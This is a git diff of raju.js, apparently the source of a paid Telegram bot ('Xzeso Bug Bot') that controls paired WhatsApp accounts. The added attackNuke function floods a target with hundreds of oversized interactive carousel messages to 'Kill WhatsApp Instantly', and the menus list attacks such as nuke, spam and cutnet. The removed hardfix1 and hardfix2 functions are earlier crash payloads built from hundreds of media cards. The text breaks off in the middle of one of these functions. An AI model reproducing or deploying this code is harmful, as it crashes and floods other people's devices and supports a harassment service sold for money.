@@ -1,8 +1,9 @@
 // =====================================================================
-// raju.js - Xzeso Bug Bot V5.0 - Enhanced Version
+// raju.js - Xzeso Bug Bot V6.0 - Complete Arabic Edition
 // =====================================================================
-// Full Feature Set: Crash Commands, Admin Panel, WhatsApp Integration
-// Total: ~5000 Lines
+// Full Feature Set: Attack Commands, Admin Panel, WhatsApp Integration
+// Subscription System, Maintenance Mode, Free Mode
+// Total: Complete Rewrite
 // =====================================================================
 
 const { Bot, InlineKeyboard, InputFile } = require("grammy");
@@ -10,50 +11,28 @@ const fs = require("fs");
 const path = require("path");
 const { exec } = require("child_process");
 const crypto = require("crypto");
+const os = require("os");
 const axios = require("axios");
 const chalk = require("chalk");
-
-// WhatsApp Dependencies
 const {
   default: makeWASocket,
   makeInMemoryStore,
   useMultiFileAuthState,
   useSingleFileAuthState,
-  initInMemoryKeyStore,
   fetchLatestBaileysVersion,
   fetchLatestWaWebVersion,
-  makeWASocket: WASocket,
-  AuthenticationState,
-  BufferJSON,
-  relayMessage,
-  downloadContentFromMessage,
-  downloadAndSaveMediaMessage,
+  DisconnectReason,
   generateWAMessage,
   generateWAMessageContent,
   generateWAMessageFromContent,
-  WANode,
-  WAMetric,
-  Mimetype,
-  MimetypeMap,
-  MediaPathMap,
-  DisconnectReason,
-  MediaConnInfo,
-  encodeWAMessage,
-  ReconnectMode,
-  AnyMessageContent,
-  waChatKey,
-  makeCacheableSignalKeyStore,
-  WAProto,
-  proto,
   jidDecode,
   encodeSignedDeviceIdentity,
-  BaileysError,
-  makeCacheableSignalKeyStore: makeCacheableStore
 } = require("@whiskeysockets/baileys");
-
 const pino = require("pino");
 const { Boom } = require("@hapi/boom");
 const config = require("./config");
+const cooldownModule = require("./controlSystem/cooldown.js");
+const cooldown = require("./controlSystem/cooldown.js");
 
 // =====================================================================
 // System Variables
@@ -63,19 +42,16 @@ const thumbnail = fs.existsSync("./storage/thumbnail.jpg")
   ? fs.readFileSync("./storage/thumbnail.jpg")
   : null;
 
-const CHANNEL_ID = config.chanelid || "I8_ZU";
-const GROUP_ID = config.chatgrupid || "I8_ZU_group";
+const CHANNEL_ID = config.chanelid || "apsanad70";
+const GROUP_ID = config.chatgrupid || "sanadcrash";
 const SESSION_DIR = path.join(".", "session");
 
-// Ensure directories exist
-["session", "storage", "database"].forEach(dir => {
-  if (!fs.existsSync(dir)) {
-    fs.mkdirSync(dir, { recursive: true });
-  }
+["session", "storage", "database", "temp"].forEach(dir => {
+  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
 });
 
 // =====================================================================
-// Logging System - Enhanced
+// Logging System
 // =====================================================================
 
 const log = {
@@ -105,28 +81,19 @@ const stats = {
   startTime: Date.now(),
   users: new Map(),
   sessions: new Map(),
-  
-  increment: function(type) {
+  increment(type) {
     if (type === 'command') this.totalCommands++;
     if (type === 'crash') this.crashCommands++;
     if (type === 'admin') this.adminCommands++;
     if (type === 'wa') this.waConnections++;
     if (type === 'error') this.errors++;
   },
-  
-  addUser: function(userId, data = {}) {
+  addUser(userId, data = {}) {
     this.users.set(userId, { ...data, joined: Date.now() });
   },
-  
-  getSessionCount: function() {
-    return Object.keys(waClients).length;
-  },
-  
-  getUptime: function() {
-    return Math.floor((Date.now() - this.startTime) / 1000);
-  },
-  
-  toJSON: function() {
+  getSessionCount() { return Object.keys(waClients).length; },
+  getUptime() { return Math.floor((Date.now() - this.startTime) / 1000); },
+  toJSON() {
     return {
       totalCommands: this.totalCommands,
       crashCommands: this.crashCommands,
@@ -140,89 +107,55 @@ const stats = {
 };
 
 // =====================================================================
-
-// =====================================================================
-// Blacklist & Whitelist System
-// =====================================================================
-
-let blacklist = [];
-let whitelist = [];
-
-function loadBlacklist() {
-  try {
-    if (fs.existsSync("./storage/blacklist.json")) {
-      blacklist = JSON.parse(fs.readFileSync("./storage/blacklist.json", "utf8"));
-    } else {
-      fs.writeFileSync("./storage/blacklist.json", JSON.stringify([], null, 2));
-      blacklist = [];
-    }
-  } catch (e) {
-    blacklist = [];
-  }
-}
-
-function saveBlacklist() {
-  try {
-    fs.writeFileSync("./storage/blacklist.json", JSON.stringify(blacklist, null, 2));
-  } catch (e) {}
-}
-
-function loadWhitelist() {
-  try {
-    if (fs.existsSync("./storage/whitelist.json")) {
-      whitelist = JSON.parse(fs.readFileSync("./storage/whitelist.json", "utf8"));
-    } else {
-      fs.writeFileSync("./storage/whitelist.json", JSON.stringify([], null, 2));
-      whitelist = [];
-    }
-  } catch (e) {
-    whitelist = [];
-  }
-}
-
-function saveWhitelist() {
-  try {
-    fs.writeFileSync("./storage/whitelist.json", JSON.stringify(whitelist, null, 2));
-  } catch (e) {}
-}
-
-loadBlacklist();
-loadWhitelist();
-
-// =====================================================================
-// Safe File Reading with Error Handling
+// Safe File Operations
 // =====================================================================
 
 function safeReadJSON(filePath, defaultValue = {}) {
   try {
-    if (fs.existsSync(filePath)) {
-      return JSON.parse(fs.readFileSync(filePath, "utf8"));
-    }
+    const fullPath = path.isAbsolute(filePath) ? filePath : path.join(__dirname, filePath);
+    if (fs.existsSync(fullPath)) return JSON.parse(fs.readFileSync(fullPath, "utf8"));
     return defaultValue;
   } catch (err) {
-    console.error(`Error reading ${filePath}: ${err.message}`);
+    console.error(`[safeRead] ${filePath}: ${err.message}`);
     return defaultValue;
   }
 }
 
 function safeWriteJSON(filePath, data) {
   try {
-    const dir = path.dirname(filePath);
-    if (!fs.existsSync(dir)) {
-      fs.mkdirSync(dir, { recursive: true });
-    }
-    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), "utf8");
+    const fullPath = path.isAbsolute(filePath) ? filePath : path.join(__dirname, filePath);
+    const dir = path.dirname(fullPath);
+    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+    fs.writeFileSync(fullPath, JSON.stringify(data, null, 2), "utf8");
     return true;
   } catch (err) {
-    console.error(`Error writing ${filePath}: ${err.message}`);
+    console.error(`[safeWrite] ${filePath}: ${err.message}`);
     return false;
   }
 }
 
-const accesDb = safeReadJSON("./storage/access.json", { users: [] });
+// =====================================================================
+// Load Databases
+// =====================================================================
+
+const accessDb = safeReadJSON("./storage/access.json", { users: [] });
 const resDb = safeReadJSON("./storage/resellers.json", { users: [] });
-const settingsDb = safeReadJSON("./database/settings.json", { freeMode: false });
+let settingsDb = safeReadJSON("./database/settings.json", { freeMode: false, maintenance: false, maintenanceMsg: "", botImage: "", admins: [], permissions: {} });
 const usersDb = safeReadJSON("./database/users.json", []);
+
+// Ensure settings structure
+if (!settingsDb.admins) settingsDb.admins = [];
+if (!settingsDb.permissions) settingsDb.permissions = {};
+if (!settingsDb.maintenance) settingsDb.maintenance = false;
+if (!settingsDb.maintenanceMsg) settingsDb.maintenanceMsg = "🛠️ البوت في وضع الصيانة. سنعود قريباً.";
+if (!settingsDb.botImage) settingsDb.botImage = "";
+safeWriteJSON("./database/settings.json", settingsDb);
+
+// =====================================================================
+// Bot Initialization
+// =====================================================================
+
+const bot = new Bot(config.telegramBotToken || "YOUR_BOT_TOKEN");
 
 // =====================================================================
 // Utility Functions
@@ -235,116 +168,221 @@ const formatUptime = (sec) => {
   const s = Math.floor(sec % 60);
   return `${h}h ${m}m ${s}s`;
 };
-
-const isOwner = (userId) => {
-  const ownerId = config.ownerId || "123456789";
-  return String(userId) === String(ownerId);
-};
-
-const isReseller = (userId) => {
-  return resDb.users && resDb.users.includes(String(userId));
-};
-
-const isFreeMode = () => {
-  return settingsDb.freeMode === true;
-};
-
+const isOwner = (userId) => String(userId) === String(config.ownerId || "6707747395");
+const isAdmin = (userId) => (settingsDb.admins || []).includes(String(userId));
+const hasAdminPermission = (userId, perm) => (settingsDb.permissions || {})[String(userId)]?.[perm] ?? true;
+const isReseller = (userId) => resDb.users && resDb.users.includes(String(userId));
+const isFreeMode = () => settingsDb.freeMode === true;
+const isMaintenance = () => settingsDb.maintenance === true;
+const getMaintenanceMessage = () => settingsDb.maintenanceMsg || "🛠️ البوت في وضع الصيانة.";
 const hasAccess = (userId) => {
   if (isFreeMode()) return true;
   if (isOwner(userId)) return true;
   if (isReseller(userId)) return true;
-  if (accesDb.users && accesDb.users.includes(String(userId))) return true;
+  if (accessDb.users && accessDb.users.includes(String(userId))) return true;
+  if (settingsDb.admins && settingsDb.admins.includes(String(userId))) return true;
   return false;
 };
-
 const isBlocked = (number) => {
-  return blacklist.includes(number);
-};
-
-const isWhitelisted = (number) => {
-  return whitelist.includes(number);
-};
-
-const getNoAccessMessage = (userId) => {
-  return `🔒 **Premium Bot Active**
-
-Currently, this bot can only be used by users with special access.
-
-━━━━━━━━━━━━━━
-💠 Bot Access Prices
-• bug bot no enc script 100% ($15 USD)
-• Basic Access: ($4 USD) / Month 
-• Lifetime Access: ($7 USD) / Lifetime
-━━━━━━━━━━━━━━
-✨ Premium Benefits
-• Full access to all features
-• Unlimited usage
-• Automatic feature updates
-• Priority support directly from the Owner
-━━━━━━━━━━━━━━
-
-📩 Want to Upgrade Your Access?
-Chat the admin to purchase access:
-• Telegram: @I8_ZU
-
-Click the ORDER button below to buy`;
+  const bl = safeReadJSON("./storage/blacklist.json", []);
+  return bl.includes(number);
 };
 
 // =====================================================================
-// Logging System - Already defined at line 81, using the first one
+// Message Helper
 // =====================================================================
 
-const logger = {
-  success: (msg) => console.log(chalk.green.bold("✓ ") + chalk.white(msg)),
-  error: (msg) => console.log(chalk.red.bold("✗ ") + chalk.white(msg)),
-  warning: (msg) => console.log(chalk.yellow.bold("⚠ ") + chalk.white(msg)),
-  info: (msg) => console.log(chalk.blue.bold("ℹ ") + chalk.white(msg)),
-  loading: (msg) => console.log(chalk.magenta.bold("⏳ ") + chalk.white(msg)),
-  user: (msg) => console.log(chalk.cyan.bold("👤 ") + chalk.white(msg)),
-  whatsapp: (msg) => console.log(chalk.green.bold("📱 ") + chalk.white(msg)),
-  telegram: (msg) => console.log(chalk.blue.bold("✈️ ") + chalk.white(msg)),
-  system: (msg) => console.log(chalk.gray.bold("⚙️  ") + chalk.white(msg)),
-};
+function getNoAccessMessage() {
+  return `<blockquote>
+<b>🔒 الوصول محظور</b>
 
-// =====================================================================
-// Cooldown System Integration
-// =====================================================================
+⚠️ ليس لديك صلاحية الوصول لهذا البوت.
 
-const cooldownModule = require("./controlSystem/sumemek.js");
-const cooldown = require("./controlSystem/cooldown.js");
+━━━━━━━━━━━━━
+💠 أسعار الوصول:
+• وصول أساسي: 4$ / شهرياً
+• وصول مدى الحياة: 7$
+━━━━━━━━━━━━━
+✨ مزايا الصلاحية:
+• وصول كامل لجميع الميزات
+• استخدام غير محدود
+• تحديثات تلقائية
+• دعم أولوي
+━━━━━━━━━━━━━
+
+📩 للتواصل مع المالك:
+Telegram: @${CHANNEL_ID.replace("@", "")}
+</blockquote>`;
+}
+
+function getMainMenuKeyboard() {
+  return new InlineKeyboard()
+    .text("🔥 الأوامر", "menu_attacks")
+    .text("📱 الجلسات", "menu_sessions")
+    .row()
+    .text("⚙️ الإعدادات", "menu_settings")
+    .text("🎫 الاشتراكات", "menu_subscriptions")
+    .row()
+    .text("👨‍💻 المطور", "menu_developer")
+    .text("🆓 مجاني", "menu_free")
+    .row()
+    .text("🛠️ الصيانة", "menu_maintenance")
+    .text("👑 الأدمن", "menu_admins")
+    .row()
+    .url("📢 القناة", `https://t.me/${CHANNEL_ID.replace("@", "")}`);
+}
+
+function getSettingsKeyboard() {
+  return new InlineKeyboard()
+    .text("🖼️ صورة البوت", "set_bot_image")
+    .text("👥 المسؤولين", "menu_admins")
+    .row()
+    .text("🔘 الوضع المجاني", "toggle_free_mode")
+    .text("🛠️ الصيانة", "toggle_maintenance")
+    .row()
+    .text("➕➖ الأوامر", "manage_commands")
+    .text("🎫 رموز الاشتراك", "manage_codes")
+    .row()
+    .text("⬅️ رجوع", "back_to_main");
+}
+
+function getDeveloperKeyboard() {
+  return new InlineKeyboard()
+    .text("📊 الإحصائيات", "dev_stats")
+    .text("🔧 أدوات", "dev_tools")
+    .row()
+    .text("📋 سجلات", "dev_logs")
+    .text("⚙️ إعدادات البوت", "menu_settings")
+    .row()
+    .text("⬅️ رجوع", "back_to_main");
+}
+
+function getAttackKeyboard() {
+  return new InlineKeyboard()
+    .text("💥 نووي", "attack_nuke")
+    .text("📨 سبام", "attack_spam")
+    .row()
+    .text("📞 صوتي", "attack_call")
+    .text("🖼️ صور", "attack_media")
+    .row()
+    .text("📸 ستكرات", "attack_stickers")
+    .text("🔌 قطع نت", "attack_cutnet")
+    .row()
+    .text("👻 خفي", "attack_ghost")
+    .text("🔒 مخفي", "attack_invisi")
+    .row()
+    .text("🎯 متعدد", "attack_mass")
+    .text("🛡️ درع", "attack_shield")
+    .row()
+    .text("🗡️ تسلل", "attack_stealth")
+    .text("⬅️ رجوع", "back_to_main");
+}
+
+function getSessionsKeyboard() {
+  return new InlineKeyboard()
+    .text("📋 قائمة الجلسات", "sess_list")
+    .text("➕ جلسة جديدة", "sess_new")
+    .row()
+    .text("🗑️ حذف كل الجلسات", "sess_clear")
+    .text("📊 إحصائيات", "sess_stats")
+    .row()
+    .text("⬅️ رجوع", "back_to_main");
+}
+
+function getSubscriptionKeyboard() {
+  return new InlineKeyboard()
+    .text("🎫 إنشاء رمز", "sub_create")
+    .text("📋 قائمة الرموز", "sub_list")
+    .row()
+    .text("🔑 تفعيل رمز", "sub_redeem")
+    .text("⏰ الاشتراكات", "sub_active")
+    .row()
+    .text("⬅️ رجوع", "back_to_main");
+}
+
+function getAdminKeyboard() {
+  return new InlineKeyboard()
+    .text("✅ إضافة مسؤول", "admin_add")
+    .text("❌ حذف مسؤول", "admin_remove")
+    .row()
+    .text("📋 قائمة المسؤولين", "admin_list")
+    .text("🔑 إدارة الرموز", "admin_codes")
+    .row()
+    .text("⬅️ رجوع", "back_to_main");
+}
 
 // =====================================================================
 // WhatsApp Session Management
 // =====================================================================
 
 const waClients = {};
-const sessionRoot = path.join(".", "session");
-if (!fs.existsSync(sessionRoot)) {
-  fs.mkdirSync(sessionRoot, { recursive: true });
-}
+if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });
 
-function getSessionPathForUser(userId) {
-  return path.join(sessionRoot, String(userId));
-}
+function getSessionPath(userId) { return path.join(SESSION_DIR, String(userId)); }
 
-async function checkSessionExistsForUser(userId) {
+async function initWhatsappForUser(telegramUserId, notifyUser = true, retryCount = 0) {
+  const MAX_RETRIES = 5;
+  const RECONNECT_DELAY = 2000;
+  const userId = String(telegramUserId);
+  const sessionPath = getSessionPath(userId);
+
   try {
-    await fs.promises.access(getSessionPathForUser(userId));
-    return true;
-  } catch {
-    return false;
+    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });
+
+    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
+    const sock = makeWASocket({
+      logger: pino({ level: "silent" }),
+      auth: state,
+      browser: ["Android", "Chrome", "24.0"],
+      syncFullHistory: false,
+      connectTimeoutMs: 60000,
+      defaultQueryTimeoutMs: 0,
+      keepAliveIntervalMs: 30000,
+      retryRequestDelayMs: 1000,
+      getMessage: async () => ({ conversation: "Message not available" }),
+      printQRInTerminal: false,
+    });
+
+    sock.ev.on("creds.update", saveCreds);
+    waClients[userId] = { sock, status: "connecting", sessionPath, lastActivity: Date.now() };
+
+    sock.ev.on("connection.update", async (update) => {
+      const { connection, lastDisconnect } = update || {};
+      try {
+        if (connection === "close") {
+          const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
+          if (reason === DisconnectReason.loggedOut || reason === 401) {
+            await deleteSessionForUser(userId);
+            try { await bot.api.sendMessage(userId, "🚫 *الجلسة انتهت*\nأعد الربط باستخدام /reqpair", { parse_mode: "Markdown" }); } catch {}
+          } else if (retryCount < MAX_RETRIES) {
+            setTimeout(() => { if (waClients[userId]) initWhatsappForUser(telegramUserId, notifyUser, retryCount + 1); }, RECONNECT_DELAY);
+          }
+        } else if (connection === "open") {
+          waClients[userId].status = "open";
+          waClients[userId].lastActivity = Date.now();
+          log.whatsapp(`✅ WhatsApp Connected: ${userId}`);
+          if (notifyUser) {
+            try { await bot.api.sendMessage(userId, "✅ *تم ربط واتساب بنجاح!*", { parse_mode: "Markdown" }); } catch {}
+          }
+        }
+      } catch (e) { log.error(`Connection update error for ${userId}: ${e.message}`); }
+    });
+
+    sock.ev.on("connection.error", (error) => { log.error(`WA Socket error for ${userId}: ${error.message}`); });
+    return sock;
+  } catch (err) {
+    log.error(`Failed to init WA for ${userId}: ${err.message}`);
+    return null;
   }
 }
 
 async function deleteSessionForUser(userId) {
   try {
-    const p = getSessionPathForUser(userId);
-    if (waClients[userId]?.sock) {
-      try { waClients[userId].sock.end(); } catch (e) {}
-      delete waClients[userId];
-    }
+    if (waClients[userId]?.sock) { try { waClients[userId].sock.end(); } catch {} }
+    delete waClients[userId];
+    const p = getSessionPath(userId);
     await fs.promises.rm(p, { recursive: true, force: true });
-    log.success(`Session for user ${userId} deleted`);
+    log.success(`Session deleted for ${userId}`);
     return true;
   } catch (err) {
     log.error(`Failed to delete session for ${userId}: ${err.message}`);
@@ -354,17 +392,12 @@ async function deleteSessionForUser(userId) {
 
 async function clearAllSessions() {
   try {
-    const folders = fs.existsSync(sessionRoot) ? fs.readdirSync(sessionRoot) : [];
+    const folders = fs.existsSync(SESSION_DIR) ? fs.readdirSync(SESSION_DIR) : [];
     for (const f of folders) {
-      if (waClients[f]?.sock) {
-        try { waClients[f].sock.end(); } catch (e) {}
-        delete waClients[f];
-      }
+      if (waClients[f]?.sock) { try { waClients[f].sock.end(); } catch {} delete waClients[f]; }
     }
     for (const f of folders) {
-      try {
-        await fs.promises.rm(path.join(sessionRoot, f), { recursive: true, force: true });
-      } catch (e) {}
+      try { await fs.promises.rm(path.join(SESSION_DIR, f), { recursive: true, force: true }); } catch {}
     }
     log.success("All sessions cleared");
     return true;
@@ -374,1438 +407,352 @@ async function clearAllSessions() {
   }
 }
 
-async function initWhatsappForUser(telegramUserId, notifyUser = true, retryCount = 0) {
-  const MAX_RETRIES = 3;
-  const RECONNECT_DELAY = 2000;
+async function requestPairingCode(telegramUserId, phone) {
   const userId = String(telegramUserId);
-  const sessionPath = getSessionPathForUser(userId);
+  if (waClients[userId]) { try { waClients[userId].sock.end(); } catch {} delete waClients[userId]; }
+  await initWhatsappForUser(userId, false);
+  await sleep(1000);
+  const client = waClients[userId]?.sock;
+  if (!client) throw new Error("Failed to create WA client");
+  if (typeof client.requestPairingCode === "function") return await client.requestPairingCode(phone);
+  throw new Error("Pairing code API not available");
+}
 
+// =====================================================================
+// Attack/Bug Functions - 10x ENHANCED - Kill WhatsApp Instantly
+// =====================================================================
+
+async function attackNuke(client, target) {
   try {
-    if (!fs.existsSync(sessionPath)) {
-      fs.mkdirSync(sessionPath, { recursive: true });
-    }
+    // 500 رسالة متوازية مع payload ضخم
+    const payloadSize = 100000;
+    const promises = [];
+    const batchSize = 50;
 
-    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
-
-    const sock = makeWASocket({
-      logger: pino({ level: "silent" }),
-      auth: state,
-      browser: ["Ubuntu", "Chrome", "20.0.04"],
-      syncFullHistory: false,
-      connectTimeoutMs: 60000,
-      defaultQueryTimeoutMs: 0,
-      keepAliveIntervalMs: 30000,
-      retryRequestDelayMs: 1000,
-      messageRetryMap: new Map(),
-      shouldIgnoreJid: (jid) => false,
-      getMessage: async (key) => ({ conversation: "Message not available" }),
-      patchMessageBeforeSending: (message) => {
-        const requiresPatch = !!(
-          message.buttonsMessage ||
-          message.templateMessage ||
-          message.listMessage
-        );
-        if (requiresPatch) {
-          message = {
+    for (let batch = 0; batch < 10; batch++) {
+      const batchPromises = [];
+      for (let i = 0; i < batchSize; i++) {
+        const msg = generateWAMessageFromContent(target, {
+          message: {
             viewOnceMessage: {
               message: {
-                messageContextInfo: {
-                  deviceListMetadataVersion: 2,
-                  deviceListMetadata: {},
-                },
-                ...message,
-              },
-            },
-          };
-        }
-        return message;
-      },
-      printQRInTerminal: false,
-      queryChatCount: 0,
-    });
-
-    sock.ev.on("creds.update", saveCreds);
-
-    waClients[userId] = {
-      sock,
-      status: "connecting",
-      sessionPath,
-      reconnecting: false,
-      lastActivity: Date.now(),
-      messageCount: 0,
-    };
-
-    const connectionMonitor = setInterval(() => {
-      if (waClients[userId]?.status === "open") {
-        const timeSinceLastActivity = Date.now() - (waClients[userId].lastActivity || Date.now());
-        if (timeSinceLastActivity > 120000) {
-          waClients[userId].lastActivity = Date.now();
-        }
-      }
-    }, 60000);
-
-    sock.ev.on("connection.update", async (update) => {
-      const { connection, lastDisconnect } = update || {};
-
-      try {
-        if (connection === "close") {
-          clearInterval(connectionMonitor);
-          const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
-          const disconnectReason = DisconnectReason[reason] || reason || "unknown";
-
-          log.warning(`WA (${userId}) disconnected: ${disconnectReason}`);
-          waClients[userId].status = "closed";
-
-          if (reason === DisconnectReason.loggedOut || reason === 401 || reason === 403) {
-            log.warning(`User ${userId} logged out. Deleting session...`);
-            try {
-              if (waClients[userId]?.sock?.end) {
-                waClients[userId].sock.end();
+                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
+                interactiveMessage: {
+                  body: { text: "💥".repeat(payloadSize) },
+                  carouselMessage: { cards: Array(50).fill({ body: { text: "🔥".repeat(10000) }, nativeFlowMessage: { buttons: [] } }) }
+                }
               }
-            } catch (e) {}
-
-            await deleteSessionForUser(userId);
-            delete waClients[userId];
-
-            try {
-              await bot.api.sendMessage(
-                telegramUserId,
-                "🚫 *WhatsApp session removed*\nYour WhatsApp session was logged out or banned. Please re-pair using /reqpair.",
-                { parse_mode: "Markdown" }
-              );
-            } catch (err) {
-              log.warning(`Failed to notify user ${userId}: ${err.message}`);
-            }
-          } else {
-            if (!waClients[userId]?.reconnecting && retryCount < MAX_RETRIES) {
-              waClients[userId].reconnecting = true;
-              log.loading(`Reconnecting WA for user ${userId} (attempt ${retryCount + 1}/${MAX_RETRIES})...`);
-
-              try {
-                if (waClients[userId]?.sock?.end) {
-                  waClients[userId].sock.end();
-                }
-                await sleep(500);
-              } catch (e) {}
-
-              setTimeout(() => {
-                if (waClients[userId]) {
-                  waClients[userId].reconnecting = false;
-                  initWhatsappForUser(telegramUserId, notifyUser, retryCount + 1);
-                }
-              }, RECONNECT_DELAY);
-            } else if (retryCount >= MAX_RETRIES) {
-              log.error(`Failed to reconnect WA for user ${userId} after ${MAX_RETRIES} attempts.`);
-              clearInterval(connectionMonitor);
-              try {
-                if (waClients[userId]?.sock?.end) {
-                  waClients[userId].sock.end();
-                }
-                await deleteSessionForUser(userId);
-                delete waClients[userId];
-
-                await bot.api.sendMessage(
-                  telegramUserId,
-                  "🚫 *WhatsApp session deleted*\nUnable to reconnect after 3 attempts. Please pair again using /reqpair.",
-                  { parse_mode: "Markdown" }
-                );
-              } catch (err) {}
             }
           }
-        } else if (connection === "open") {
-          waClients[userId].status = "open";
-          waClients[userId].lastActivity = Date.now();
-          log.whatsapp(`✅ WhatsApp Connected for user ${userId}!`);
-
-          const { pairingMessageId, waitMessageId } = waClients[userId] || {};
-          try {
-            if (pairingMessageId) await bot.api.deleteMessage(telegramUserId, pairingMessageId).catch(() => {});
-            if (waitMessageId) await bot.api.deleteMessage(telegramUserId, waitMessageId).catch(() => {});
-            waClients[userId].pairingMessageId = null;
-            waClients[userId].waitMessageId = null;
-          } catch (e) {}
-
-          if (notifyUser) {
-            try {
-              await bot.api.sendMessage(
-                telegramUserId,
-                `✅ *WhatsApp paired successfully.*\nYour session is ready to use.`,
-                { parse_mode: "Markdown" }
-              );
-            } catch (err) {}
-          }
-        }
-      } catch (e) {
-        log.error(`Error in connection.update for user ${userId}: ${e.message}`);
-      }
-    });
-
-    sock.ev.on("connection.error", (error) => {
-      log.error(`Socket error for ${userId}: ${error.message}`);
-    });
-
-    return sock;
-  } catch (err) {
-    log.error(`Failed to init WhatsApp for user ${userId}: ${err.message}`);
-    return null;
-  }
-}
-
-async function requestPairingCodeForUser(telegramUserId, phone) {
-  try {
-    const userId = String(telegramUserId);
-
-    // حذف الجلسة القديمة إذا كانت موجودة
-    if (waClients[userId]) {
-      try {
-        if (waClients[userId].sock) {
-          await waClients[userId].sock.end();
-        }
-      } catch (e) {
-        console.log(`Error closing old session for ${userId}: ${e.message}`);
-      }
-      delete waClients[userId];
-      console.log(`Old session deleted for ${userId}`);
-    }
-
-    // إنشاء جلسة جديدة
-    await initWhatsappForUser(userId, false);
-    await new Promise((r) => setTimeout(r, 2000));
-
-    const client = waClients[userId]?.sock;
-    if (!client) throw new Error("Failed to create WA client for pairing");
-
-    if (typeof client.requestPairingCode === "function") {
-      const code = await client.requestPairingCode(phone);
-      return code;
-    } else {
-      throw new Error("Pairing code API not available");
-    }
-  } catch (err) {
-    console.log(`Pairing error: ${err.message}`);
-    throw err;
-  }
-}
-// =====================================================================
-// raju.js - Xzeso Bug Bot (Version 4.0 - Full 4500+ Lines)
-// =====================================================================
-// PART 2/7: Lines 651-1300
-// Total: ~4550 Lines
-// =====================================================================
-
-// =====================================================================
-// CRASH / BUG FUNCTIONS - All 20+ Functions
-// =====================================================================
-
-async function hardfix1(client, X) {
-  try {
-    let cards = [];
-    const maxCards = 500;
-
-    for (let r = 0; r < maxCards; r++) {
-      cards.push({
-        body: { text: '' },
-        header: {
-          title: '',
-          imageMessage: {
-            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
-            mimetype: "image/jpeg",
-            fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
-            fileLength: "98",
-            height: 4,
-            width: 4,
-            mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
-            fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
-            directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
-            mediaKeyTimestamp: "1749728782"
-          },
-          hasMediaAttachment: true
-        },
-        nativeFlowMessage: {
-          messageParamsJson: '',
-          buttons: [{
-            name: "voice_call",
-            buttonParamsJson: {}
-          }]
-        }
-      });
-    }
-
-    const msg = await generateWAMessageFromContent(X, {
-      viewOnceMessage: {
-        message: {
-          messageContextInfo: {
-            deviceListMetadata: {},
-            deviceListMetadataVersion: 2
-          },
-          interactiveMessage: {
-            body: { text: '𝗫 - 𝗭 𝗘 𝗡 𝗢' },
-            carouselMessage: {
-              cards: cards
-            },
-            contextInfo: {
-              participant: "0@s.whatsapp.net",
-              quotedMessage: {},
-              remoteJid: "@s.whatsapp.net"
-            }
-          }
-        }
-      }
-    }, {});
-
-    await client.relayMessage(X, {
-      groupStatusMessageV2: {
-        message: msg.message,
-      },
-    }, {
-      messageId: msg.key.id,
-      participant: { jid: X },
-    });
-
-    await sleep(100);
-  } catch (err) {
-    log.error(`hardfix1 error: ${err.message}`);
-  }
-}
-
-async function hardfix2(client, X) {
-  try {
-    let cards = [];
-    const maxCards = 300;
-
-    for (let r = 0; r < maxCards; r++) {
-      cards.push({
-        body: { text: " " },
-        footer: { text: " " },
-        header: {
-          title: " ",
-          hasMediaAttachment: true,
-          imageMessage: {
-            url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
-            mimetype: "image/jpeg",
-            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
-            fileLength: "18352",
-            height: 720,
-            width: 1280,
-            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
-            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
-            directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
-            mediaKeyTimestamp: "1737281900",
